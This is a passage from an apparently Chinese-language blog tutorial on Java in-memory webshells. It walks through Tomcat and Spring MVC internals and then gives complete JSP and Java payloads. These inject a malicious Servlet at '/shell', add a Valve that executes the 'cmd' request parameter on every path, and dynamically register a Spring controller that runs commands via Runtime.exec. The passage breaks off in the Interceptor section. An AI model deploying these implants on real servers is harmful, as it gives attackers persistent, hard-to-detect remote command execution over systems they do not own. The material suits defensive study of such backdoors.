                    log.error(sm.getString("standardContext.listenerFail"));
                    ok = false;
                }
            }
 
 
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString("standardContext.managerFail"), e);
                ok = false;
            }
 
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString("standardContext.filterFail"));
                    ok = false;
                }
            }
 
            // Load and initialize all "load on startup" servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString("standardContext.servletFail"));
                    ok = false;
                }
 
            }
 
            // Start ContainerBackgroundProcessor thread
 
            super.threadStart();
 
        }
 
...
```
这里用
```java
fireLifecycleEvent(Lifecycle.CONFIGURE_START_EVENT, null);
```
这个方法解析webxml，跟进去看一下
```java
 protected void fireLifecycleEvent(String type, Object data) {
        LifecycleEvent event = new LifecycleEvent(this, type, data);
        for (LifecycleListener listener : lifecycleListeners) {
            listener.lifecycleEvent(event);
        }
    }
```
创造standardconwrapper对象
```java
 private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
 
...   //设置StandardContext参数
 
        
        for (ServletDef servlet : webxml.getServlets().values()) {
 
            //创建StandardWrapper对象
            Wrapper wrapper = context.createWrapper();
 
            if (servlet.getLoadOnStartup() != null) {
 
                //设置LoadOnStartup属性
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
 
            //设置ServletName属性
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
 
            //设置ServletClass属性
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
 
            //将包装好的StandWrapper添加进ContainerBase的children属性中
            context.addChild(wrapper);
 
           for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
          
            //添加路径映射
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
```
addServletMappingDecoded，用于添加路径映射。
通过
```java
for (Container child : findChildren()) {
                    if (!child.getState().isAvailable()) {
                        child.start();
                    }
                }
```
获取standardwrapper对象。
loadOnStartup加载
```java
public boolean loadOnStartup(Container children[]) {

        // Collect "load on startup" servlets that need to be initialized
        TreeMap<Integer, ArrayList<Wrapper>> map = new TreeMap<>();
        for (Container child : children) {
            Wrapper wrapper = (Wrapper) child;
            int loadOnStartup = wrapper.getLoadOnStartup();
            if (loadOnStartup < 0) {
                continue;
            }
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList<Wrapper> list = map.get(key);
            if (list == null) {
                list = new ArrayList<>();
                map.put(key, list);
            }
            list.add(wrapper);
        }

        // Load the collected "load on startup" servlets
        for (ArrayList<Wrapper> list : map.values()) {
            for (Wrapper wrapper : list) {
                try {
                    wrapper.load();
                } catch (ServletException e) {
                    getLogger().error(sm.getString("standardContext.loadOnStartup.loadException",
                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));
                    // NOTE: load errors (including a servlet that throws
                    // UnavailableException from the init() method) are NOT
                    // fatal to application startup
                    // unless failCtxIfServletStartFails="true" is specified
                    if(getComputedFailCtxIfServletStartFails()) {
                        return false;
                    }
                }
            }
        }
        return true;

    }
```
## 步骤

1. 获取StandardContext对象
2. 编写恶意Servlet
3. 通过StandardContext.createWrapper()创建StandardWrapper对象
4. 设置StandardWrapper对象的loadOnStartup属性值
5. 设置StandardWrapper对象的ServletName属性值
6. 设置StandardWrapper对象的ServletClass属性值
7. 将StandardWrapper对象添加进StandardContext对象的children属性中
8. 通过StandardContext.addServletMappingDecoded()添加对应的路径映射
### standardcontext对象获取
```java
<%
  Field reqF =  request.getClass().getDeclaredField("request");
  reqF.setAccessible(true);
   StandardContext standardContext = (StandardContext) req.getContext();
%>
```
直接就能获取到Standardrequest对象。
或：
```java
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
```
### 创造恶意对象
```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%
  Field reqF =  request.getClass().getDeclaredField("request");
  reqF.setAccessible(true);
  Request req = (Request) reqF.get(request);
%>
<%!
    public class Shell_Servlet implements Servlet{

      @Override
      public void init(ServletConfig servletConfig) throws ServletException {

      }

      @Override
      public ServletConfig getServletConfig() {
        return null;
      }

      @Override
      public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("Servletjapcmd");
        if (cmd !=null){
          try{
            Runtime.getRuntime().exec(cmd);
          }catch (IOException e){
            e.printStackTrace();
          }catch (NullPointerException n){
            n.printStackTrace();
          }
        }
      }

      @Override
      public String getServletInfo() {
        return null;
      }

      @Override
      public void destroy() {

      }
    }

%>
```
实现多种方法，重写个service。
### 封装wrapper
```java
<%
  Shell_Servlet shell_servlet = new Shell_Servlet();
  String name = shell_servlet.getClass().getSimpleName();

  Wrapper wrapper = standardContext.createWrapper();
  wrapper.setLoadOnStartup(1);
  wrapper.setName(name);
  wrapper.setServlet(shell_servlet);
  wrapper.setServletClass(shell_servlet.getClass().getName());
%>
```
### 装入standardcontext
```java
<%
  standardContext.addChild(wrapper);
  standardContext.addServletMappingDecoded("/shell",name);
%>
```
### 完整版
```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>

<%
  Field reqF =  request.getClass().getDeclaredField("request");
  reqF.setAccessible(true);
  Request req = (Request) reqF.get(request);
  StandardContext standardContext = (StandardContext) req.getContext();
%>
<%!
    public class Shell_Servlet implements Servlet{

      @Override
      public void init(ServletConfig servletConfig) throws ServletException {

      }

      @Override
      public ServletConfig getServletConfig() {
        return null;
      }

      @Override
      public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("Servletjspcmd");
        if (cmd !=null){
          try{
            Runtime.getRuntime().exec(cmd);
          }catch (IOException e){
            e.printStackTrace();
          }catch (NullPointerException n){
            n.printStackTrace();
          }
        }
      }

      @Override
      public String getServletInfo() {
        return null;
      }

      @Override
      public void destroy() {

      }
    }

%>
<%
  Shell_Servlet shell_servlet = new Shell_Servlet();
  String name = shell_servlet.getClass().getSimpleName();

  Wrapper wrapper = standardContext.createWrapper();
  wrapper.setLoadOnStartup(1);
  wrapper.setName(name);
  wrapper.setServlet(shell_servlet);
  wrapper.setServletClass(shell_servlet.getClass().getName());
%>
<%
  standardContext.addChild(wrapper);
  standardContext.addServletMappingDecoded("/shell",name);
%>
```
启动后，先访问Servlet.jsp，再通过shell路由，然后命令执行。
# value
pipeline接口：
```java
public interface Pipeline extends Contained {
 
    public Valve getBasic();
 
    public void setBasic(Valve valve);
 
    public void addValve(Valve valve);
 
    public Valve[] getValves();
 
    public void removeValve(Valve valve);
 
    public void findNonAsyncValves(Set<String> result);
}
```
Value接口
```java
public interface Valve {
 
    public Valve getNext();
 
    public void setNext(Valve valve);
 
    public void backgroundProcess();
 
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
 
    public boolean isAsyncSupported();
}
```
getNext可调用下一个value，类似于js的中间件.。
## 分析过程
在org.apache.catalina.connector.CoyoteAdapter#service方法中：
```java
public void service(org.apache.coyote.Request req, org.apache.coyote.Response res)
            throws Exception {

        Request request = (Request) req.getNote(ADAPTER_NOTES);
        Response response = (Response) res.getNote(ADAPTER_NOTES);

        if (request == null) {
            // Create objects
            request = connector.createRequest();
            request.setCoyoteRequest(req);
            response = connector.createResponse();
            response.setCoyoteResponse(res);

            // Link objects
            request.setResponse(response);
            response.setRequest(request);

            // Set as notes
            req.setNote(ADAPTER_NOTES, request);
            res.setNote(ADAPTER_NOTES, response);

            // Set query string encoding
            req.getParameters().setQueryStringCharset(connector.getURICharset());
        }

        if (connector.getXpoweredBy()) {
            response.addHeader("X-Powered-By", POWERED_BY);
        }

        boolean async = false;
        boolean postParseSuccess = false;

        req.getRequestProcessor().setWorkerThreadName(THREAD_NAME.get());

        try {
            // Parse and set Catalina and configuration specific
            // request parameters
            postParseSuccess = postParseRequest(req, request, res, response);
            if (postParseSuccess) {
                //check valves if we support async
                request.setAsyncSupported(
                        connector.getService().getContainer().getPipeline().isAsyncSupported());
                // Calling the container
                connector.getService().getContainer().getPipeline().getFirst().invoke(
                        request, response);
            
```
前面是对requests和response对象的创建，
接着是
```java
connector.getService().getContainer().getPipeline().getFirst().invoke(
                        request, response);
```
getService
```java
public Service getService() {
        return this.service;
    }
```
获得connector的service，standardservice
getContainer
```java
public Engine getContainer() {
        return engine;
    }
```
获取standardEngine。
getpipeline获取StandardPipeline
```java
public Valve getFirst() {
        if (first != null) {
            return first;
        }

        return basic;
    }
}

```
获取第一个值。
standardengineinvoke调用invoke
```java
public final void invoke(Request request, Response response)
        throws IOException, ServletException {

        // Select the Host to be used for this Request
        Host host = request.getHost();
        if (host == null) {
            // HTTP 0.9 or HTTP 1.0 request without a host when no default host
            // is defined.
            // Don't overwrite an existing error
            if (!response.isError()) {
                response.sendError(404);
            }
            return;
        }
        if (request.isAsyncSupported()) {
            request.setAsyncSupported(host.getPipeline().isAsyncSupported());
        }

        // Ask this Host to process this request
        host.getPipeline().getFirst().invoke(request, response);
    }
}
```
```java
host.getPipeline().getFirst().invoke(request, response);
```
调用后面的value。

根据上文的分析我们能够总结出Valve型内存马的注入思路

获取StandardContext对象
通过StandardContext对象获取StandardPipeline
编写恶意Valve
通过StandardPipeline.addValve()动态添加Valve。
## 构造payload流程
### 获取StandardContext和pipline对象:
```java
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
 
    Pipeline pipeline = standardContext.getPipeline();
%>
```
### 恶意方法
```java
<%!
    class Shell_Valve extends ValveBase {
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%>
```
### 放入pipline
```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
 
    Pipeline pipeline = standardContext.getPipeline();
%>
 
<%!
    class Shell_Valve extends ValveBase {
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%>
 
<%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%>
```
访问Value.jsp
即可在任意路径执行cmd。
# Spring
在idea创建好一个spring的项目后，就可以写controller，用来实现业务逻辑。
```java
package com.example.spring;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.ComponentScan;

@SpringBootApplication

public class SpringtestApplication {

    public static void main(String[] args) {
        SpringApplication.run(SpringtestApplication.class, args);
    }

}

```
```java
package com.example.spring.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloWorldController {


    @RequestMapping("/hello")
    public String Hello(){

        return "Hello World!";
    }
}
```
明明controller要放在主类下面，不知道为什么师傅要分开写，浪费我大半天时间。
Tomcat就是这样一种服务器，它其实就是一个能够监听TCP连接请求，解析HTTP报文，将解析结果传给处理逻辑器、接收处理逻辑器的返回结果并通过TCP返回给浏览器的一个框架。在Tomcat各种组件中，Connnector就是负责网络通信的，而Container中的Servlet就是我们的逻辑处理器

Spring是利用注解、反射和模板等技术实现的一种框架
客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。

# SpringMVC
新建一个maven项目。

pom.xml
```java
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org</groupId>
    <artifactId>SpringMVC</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>1.7</maven.compiler.source>
        <maven.compiler.target>1.7</maven.compiler.target>
        <org.springframework-version>4.2.0.RELEASE</org.springframework-version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.11</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>${org.springframework-version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>${org.springframework-version}</version>
        </dependency>

        <!-- Tag libs support for view layer -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>taglibs</groupId>
            <artifactId>standard</artifactId>
            <version>1.1.2</version>
            <scope>runtime</scope>
        </dependency>

    </dependencies>

</project>
```
版本一定要高，亲测4.1.4不太行。4.2以上起码
在WEB-INF下建立一个springmvc.xml
```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">

    <mvc:annotation-driven />
    <context:component-scan base-package="com.controller"/>

    <!-- 开启springMVC的注解驱动，使得url可以映射到对应的controller -->


    <!-- 视图解析 -->
    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/views/"/>
        <property name="suffix" value=".jsp"/>
    </bean>


</beans>
```
但是此时还是不能注册controller。
日志写load发生异常，
![微信截图_20230613090109.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686618075839-f127ba3c-d475-427c-bdf9-b27dc81a2570.png#averageHue=%233d4144&clientId=u48e94a6a-151b-4&from=paste&height=461&id=u0fb3cfb3&originHeight=576&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30314&status=done&style=none&taskId=u2b4d8851-848d-47dc-b476-bd822a632a2&title=&width=969.6)需要去工件那，在WEB-INF下添加lib目录，并且lib里面加入所有的库。
# Controller型🐎
## ioc
如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。

IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。

Spring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者。
有个applicationContext，接口自BeanFactory。
```java
public interface ApplicationContext extends EnvironmentCapable, ListableBeanFactory, HierarchicalBeanFactory,
		MessageSource, ApplicationEventPublisher, ResourcePatternResolver
```
![](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686618633026-4dba0744-ee99-40aa-b93b-7c6aef8b41c9.png#averageHue=%232d2d2d&clientId=u48e94a6a-151b-4&from=paste&id=ude64426e&originHeight=261&originWidth=1509&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uec852ed7-511c-400c-a389-5643d9a374d&title=)

## Root Context和Child Context
```java
 <servlet>
        <servlet-name>spring</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>

            <param-value>/WEB-INF/springmvc.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>spring</servlet-name>

        <url-pattern>/</url-pattern>
    </servlet-mapping>
```
在web.xml中配置DispatcherServlet作为应用程序的前端控制器，并指定其映射路径。
这里设置了spring作为别名。
contextConfigLocation在没有显示配置时，会寻找路径/WEB-INF/springmvc.xml，将其作为配置文件。
每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。

- 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中
- Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context
- 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean

ContextLoaderListener用来初始化Root WebApplicationContext，与其它child Context共享IOC容器，childContext访问root的bean。
## 流程
获取上下文环境
注册恶意Controller
配置路径映射。

## 步骤实现
### 获取上下文
```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```
获得XmlWebApplicationContext，为RootWebapplicationContext的实例。
```java
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```
_通过这种方法获得的也是一个 _Root WebApplicationContext。其中 WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。
太长了，分析不来。
(ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()：通过RequestContextHolder获取当前请求的ServletRequestAttributes对象，可以获取到当前的HTTP请求对象。
getRequest()：从ServletRequestAttributes对象中获取当前的HTTP请求对象。
RequestContextUtils.getWebApplicationContext(request)：通过RequestContextUtils工具类，传入当前的HTTP请求对象，获取到对应的WebApplicationContext。
getServletContext()：从获取到的WebApplicationContext对象中，调用getServletContext()方法获取Servlet上下文对象。

WebApplicationContextUtils.getWebApplicationContext(servletContext)：通过WebApplicationContextUtils工具类，传入Servlet上下文对象，获取到WebApplicationContext对象。
```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```
获得 Child WebApplicationContext
```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```
所有的Context创立后，会被添加到ServletContext的，因此可以通过ServletContext的context属性获得Child WebApplicationContext。
RequestContextHolder.currentRequestAttributes()获取http请求对象，从RequestAttributes对象中通过指定的属性名称获取属性值。
### 动态注册controller
RequestMappingHandlerMapping是Spring MVC框架中的一个核心组件，用于处理请求映射和处理器方法的映射关系。它的作用是将请求URL和处理器方法进行匹配，以确定哪个方法应该处理特定的请求。
RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。
在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。
另外一个是ApplicationContext是由org.springframework.web.servlet.DispatcherServlet完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。


org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping。
regismapping
```java
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class)
```
获取实例bean。
```java
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
```
反射获得controller的method。

```java
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
```
注册地址。
```java
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
```
允许get、post方法。
```java
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```
内存动态注册controller。
registerhandler
找到org.springframework.web.servlet.handler.AbstractUrlHandlerMapping。
在registerHandler中
```java
 protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
        Assert.notNull(urlPath, "URL path must not be null");
        Assert.notNull(handler, "Handler object must not be null");
        Object resolvedHandler = handler;
        if (!this.lazyInitHandlers && handler instanceof String) {
            String handlerName = (String)handler;
            if (this.getApplicationContext().isSingleton(handlerName)) {
                resolvedHandler = this.getApplicationContext().getBean(handlerName);
            }
        }

        Object mappedHandler = this.handlerMap.get(urlPath);
        if (mappedHandler != null) {
            if (mappedHandler != resolvedHandler) {
                throw new IllegalStateException("Cannot map " + this.getHandlerDescription(handler) + " to URL path [" + urlPath + "]: There is already " + this.getHandlerDescription(mappedHandler) + " mapped.");
            }
        } else if (urlPath.equals("/")) {
            if (this.logger.isInfoEnabled()) {
                this.logger.info("Root mapping to " + this.getHandlerDescription(handler));
            }

            this.setRootHandler(resolvedHandler);
        } else if (urlPath.equals("/*")) {
            if (this.logger.isInfoEnabled()) {
                this.logger.info("Default mapping to " + this.getHandlerDescription(handler));
            }

            this.setDefaultHandler(resolvedHandler);
        } else {
            this.handlerMap.put(urlPath, resolvedHandler);
            if (this.logger.isInfoEnabled()) {
                this.logger.info("Mapped URL path [" + urlPath + "] onto " + this.getHandlerDescription(handler));
            }
        }

    }
```
该方法接受urlpath和handler参数，通过getApplicationContext().getBean(handlerName)获取名为handler的bean的值。然后注册到handlermap里面去。
```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```
detectHandlerMethods
AbstractHandlerMethodMapping的detectHandlerMethods()
```java
protected void detectHandlerMethods(Object handler) {
        Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
        final Map<Method, T> mappings = new IdentityHashMap();
        final Class<?> userType = ClassUtils.getUserClass(handlerType);
        Set<Method> methods = HandlerMethodSelector.selectMethods(userType, new ReflectionUtils.MethodFilter() {
            public boolean matches(Method method) {
                T mapping = AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType);
                if (mapping != null) {
                    mappings.put(method, mapping);
                    return true;
                } else {
                    return false;
                }
            }
        });
        Iterator var6 = methods.iterator();

        while(var6.hasNext()) {
            Method method = (Method)var6.next();
            this.registerHandlerMethod(handler, method, mappings.get(method));
        }

    }
```
该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean.
```java
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("恶意Controller").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```
```java
package com.shell.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class shell_controller {

    //    @ResponseBody
    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```
mlgb本地打不出来，bean对象是不是没这方法啊。
破案了，更换版本还得去lib把之前spring版本的jar包删了。
先访问control路由，返回404正常，再访问shell?cmd=calc弹计算器。
# Interceptor型内存马
Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。


- 通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义
- 通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义


HandlerInterceptor接口有三个方法:

- preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。
- postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
- afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。
```java
package com.shell.interceptor;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class Spring_interceptor implements HandlerInterceptor {
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler) throws Exception{
        String url = request.getRequestURI();
        PrintWriter writer = response.getWriter();//以文本形式返回响应.
        if ( url.indexOf("/login") >= 0){
            writer.write("LoginIn");
            writer.flush();
            writer.close();
            return true;
        }
        writer.write("LoginInFirst");
        writer.flush();
        writer.close();
        return false;

    }

    @Override
    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {
        
    }

    @Override
    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {

    }
}

```
注册interceptor
```java
<mvc:interceptors>
        <mvc:interceptor>
            <mvc:mapping path="/*"/>
            <bean class="com.shell.interceptor.Spring_interceptor"/>
